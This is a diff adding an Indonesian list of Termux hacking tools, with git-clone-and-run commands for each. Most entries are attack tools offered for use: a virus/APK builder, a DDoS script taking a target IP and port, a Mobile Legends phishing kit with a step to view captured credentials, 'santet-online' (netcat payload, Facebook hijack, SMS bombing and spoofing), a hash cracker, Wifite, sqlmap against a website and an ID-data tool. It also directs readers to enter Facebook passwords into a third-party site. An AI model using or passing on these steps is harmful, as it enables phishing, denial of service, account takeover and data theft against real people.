@@ -1,0 +1,144 @@
+KUMPULAN TOOL TERMUX TERBARU 2019 LENGKAP
+
+PENYUSUN:LILUNG(RIANTO)
+
+JIKA ADA MASALAH ATAU KENDALA SILAKAN HUBUNGI:
+
+FB:LILUNG
+IG:LILUNG_PROJECT
+YT:LILUNG PROJECT
+WA:083824483217
+
+1.NIK dan KK Gratis
+
+$ pkg install php git 
+$ git clone https://github.com/IndonesianSecurity/kkktp 
+$ cd kkktp
+$ php kkktp.php
+
+2.Menjalankan Musik di Termux
+
+$ pkg install mpv 
+$ mpv /lokasi/musik/musik.mp3
+
+3.Crack hash password
+
+$ git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/ 
+$ cd FHX-Hash-Killer 
+$ python2 FHXHashKiller.py
+
+4.Cara Menginstall Metasploit di Termux
+
+$ pkg install curl $ curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh 
+$ chmod +x metasploit.sh 
+$ ./metasploit.sh
+ 
+5.Cara Install Wifite di Termux Android
+
+$ git clone https://github.com/derv82/wifite 
+$ cd wifite 
+$ chmod 777 wifite.py
+$ python2 wifite.py
+
+6.Bruteforce
+
+$ pkg install pip 
+$ pip install wordlist 
+$ pkg install worlist 
+$ wordlist -h 
+$ cd /sdcard 
+$ cat pas.txt
+
+7.Redhawk
+
+$ git clone https://github.com/Tuhinshubhra/RED_HAWK
+$ cd RED_HAWK 
+$ chmod +x rhawk.php 
+$ php rhawk.php
+
+8.SQLMAP
+
+$ git clone https://github.com/sqlmapproject/sqlmap 
+$ cd sqlmap 
+$ python2 sqlmap.py
+$ python2 sqlmap.py -u website.com --dbs
+
+Mengetahui semua parameter Sqlmap
+$ python2 sqlmap.py -hh
+
+9.Melacak IP
+
+$ git clone https://github.com/maldevel/IPGeolocation
+$ cd IPGeolocation 
+$ chmod +x ipgeolocation.py 
+$ pip install -r requirements.txt 
+$ python ipgeolocation.py -m 
+$ python ipgeolocation.py -t IPnya
+
+10.Membuat Virus
+
+$ git clone https://github.com/viruz09/CreaterVirus 
+$ cd CreaterVirus 
+$ python2 creater.py
+
+-cara copy virus
+$ cp agents.apk /lokasi/folder
+
+11.DDOS
+
+$ git clone https://github.com/4L13199/LITEDDOS
+$ python2 LITEDDOS.py [ip target atau domain] [port] [jumlah traffic]
+
+12.Cara Install Santet Online Di Termux
+
+Fitur
+
+Create a Netcat Payload and ListenerFacebook Group Hijack AttackSMS Bomber Attack VectorsSMS Spoof Attack VectorsDenial-of-Service Attack.
+
+$ git clone https://github.com/Gameye98/santet-online 
+$ cd santet-online 
+$ python2 santet.py
+
+13.Tools B4J1N94N
+
+$ git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5 
+$ cd B4J1N64Nv5 
+$ sh B4J1N64N.sh
+
+14.Hack Akun Game Mobile Legends
+
+$ git clone https://github.com/Senitopeng/PhisingGame.git 
+$ cd PhisingGame 
+$ python2 phising.py
+
+lihat hasil phising
+$ cd PhisingGame cat buku.txt
+
+15. Cara Menghapus Teman Facebook (FB) Yang Sudah Tidak Aktif Sekaligus.
+
+$ pkg install git && pkg install php
+$ git clone https://github.com/dandyraka/FacebookUnfriend
+$ cd FacebookUnfriend
+
+Setelah itu, buka situs bot.agunghostkey(.)com, lalu masukan username dan password kalian, pada form yang ada, setelah itu klik tombol Get Token, lalu salin token kalian.
+
+jalankan script FacebookUnfriend
+$ php unfriend.php
+
+masukan token fb kalian dan otomatis script berjalan.
+
+16.Cara Mengaktifkan Profile Picture Guard Di Facebook 
+
+$ pkg install git
+$ pkg install python
+$ git clone https://github.com/jaxBCD/FBshield
+$ cd FBshield
+$ python guard.py --user email/username kalian --password password/kata sandi kalian --enable
+
+contoh:
+$ python guard.py --user lilung project --password lilungproject --enable
+
+jika ingin mematikan profil guard tinggal
+$ python guard.py --user email/username kalian --password password/kata sandi kalian --disable
+
+
